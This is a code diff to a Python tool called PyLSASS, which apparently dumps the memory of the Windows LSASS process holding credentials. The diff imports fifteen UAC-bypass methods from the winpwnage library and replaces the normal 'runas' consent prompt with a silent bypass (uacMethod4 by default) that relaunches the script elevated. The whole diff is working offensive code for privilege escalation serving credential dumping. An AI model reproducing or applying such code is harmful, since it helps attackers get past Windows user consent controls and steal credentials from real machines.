@@ -9,13 +9,31 @@ from win32com.shell.shell import ShellExecuteEx
 import win32con
 import win32file
 import win32security
+from winpwnage.functions.uac.uacMethod1 import uacMethod1
+from winpwnage.functions.uac.uacMethod2 import uacMethod2
+from winpwnage.functions.uac.uacMethod3 import uacMethod3
+from winpwnage.functions.uac.uacMethod4 import uacMethod4
+from winpwnage.functions.uac.uacMethod5 import uacMethod5
+from winpwnage.functions.uac.uacMethod6 import uacMethod6
+from winpwnage.functions.uac.uacMethod7 import uacMethod7
+from winpwnage.functions.uac.uacMethod8 import uacMethod8
+from winpwnage.functions.uac.uacMethod9 import uacMethod9
+from winpwnage.functions.uac.uacMethod10 import uacMethod10
+from winpwnage.functions.uac.uacMethod11 import uacMethod11
+from winpwnage.functions.uac.uacMethod12 import uacMethod12
+from winpwnage.functions.uac.uacMethod13 import uacMethod13
+from winpwnage.functions.uac.uacMethod14 import uacMethod14
+from winpwnage.functions.uac.uacMethod15 import uacMethod15
+import winreg
 
 
 dbghelp = ctypes.windll.dbghelp
 
 class PyLSASS:
 
-    def __init__(self, user = os.getlogin()):
+    def __init__(self, user = os.getlogin(), bypass_function = uacMethod4):
+        self._bypass_function = bypass_function
+
         if not self._is_admin():
             self._run_as_admin()
             sys.exit(0)
@@ -35,10 +53,7 @@ class PyLSASS:
         return bool(ctypes.windll.shell32.IsUserAnAdmin())
 
     def _run_as_admin(self):
-        arguments = [sys.executable] + sys.argv
-        cmd = f'"{arguments[0]}"'
-        params = " ".join([f'"{argument}"'  for argument in arguments[1:]])
-        ShellExecuteEx(nShow = win32con.SW_SHOWNORMAL, fMask = shellcon.SEE_MASK_NOCLOSEPROCESS, lpVerb = "runas", lpFile = cmd, lpParameters = params)
+        self._bypass_function([r"C:\Windows\System32\cmd.exe", "/k", "python", f"{__file__}"])
 
     def _get_pid(self):
         for process in psutil.process_iter():
